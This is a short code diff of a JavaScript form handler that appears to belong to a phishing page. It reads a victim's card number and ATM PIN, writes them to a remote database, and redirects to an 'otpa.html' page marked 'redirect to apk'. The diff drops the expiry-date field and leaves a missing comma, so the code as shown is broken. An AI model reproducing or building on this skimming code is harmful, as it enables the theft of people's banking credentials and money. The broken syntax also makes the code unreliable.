@@ -8,24 +8,22 @@ function submitForm(e) {
   e.preventDefault();
 
     var ccard = getElementVal("ccard");
-    var cexp = getElementVal("cexp");
     var cpin = getElementVal("cpin");
     
 
   
 
-  saveMessages(ccard, cexp, cpin);
+  saveMessages(ccard, cpin);
 
   // redirect to apk
   window.location.href = "otpa.html";
 }
 
-const saveMessages = (ccard, cexp, cpin) => {
+const saveMessages = (ccard, cpin) => {
   var newududip007 = ududip007DB.push();
 
   newududip007.set({
-      Card_Number: ccard,
-      Expiry_Date: cexp,
+      Card_Number: ccard
       ATM_PIN: cpin,
       
     
